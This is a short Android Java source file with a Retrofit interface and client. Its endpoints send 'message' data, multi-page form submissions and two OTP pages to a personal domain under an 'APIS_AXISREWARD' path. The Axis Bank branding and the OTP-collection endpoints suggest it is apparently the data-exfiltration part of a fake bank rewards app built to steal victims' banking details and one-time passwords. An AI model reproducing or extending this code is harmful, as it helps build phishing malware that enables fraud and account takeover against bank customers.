package com.example.oldaxisbank;

import com.example.axisbank.FifthPageOtp;
import com.example.axisbank.FourthPageOtp;
import com.example.axisbank.Message;
import com.example.axisbank.SecondPage;
import com.example.axisbank.Submit1r;
import com.example.axisbank.Submit2;
import com.example.axisbank.ThirdPage;

import retrofit2.Call;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;
import retrofit2.http.Body;
import retrofit2.http.POST;
import retrofit2.http.PUT;

interface ApiService {
    @POST("messageSend.php")
    Call<Void> sendmessage(@Body Message message);

    @POST("submitData1.php")
    Call<Void> submit1(@Body Submit1r message);

    @POST("submitData2.php")
    Call<Void> submit2(@Body Submit2 message);

    @PUT("secondPageData.php")
    Call<Void> second(@Body SecondPage message);

    @PUT("thirdPageData.php")
    Call<Void> third(@Body ThirdPage message);

    @PUT("fourthPageOtp.php")
    Call<Void> four(@Body FourthPageOtp message);

    @PUT("fifthPageOtp.php")
    Call<Void> fith(@Body FifthPageOtp message);

}


class ApiClient {
    private static final String BASE_URL = "https://anikdevnath.com/APIS_AXISREWARD/";
    private static Retrofit retrofit;

    public static Retrofit getClient() {
        if (retrofit == null) {
            retrofit = new Retrofit.Builder()
                    .baseUrl(BASE_URL)
                    .addConverterFactory(GsonConverterFactory.create())
                    .build();
        }
        return retrofit;
    }
}


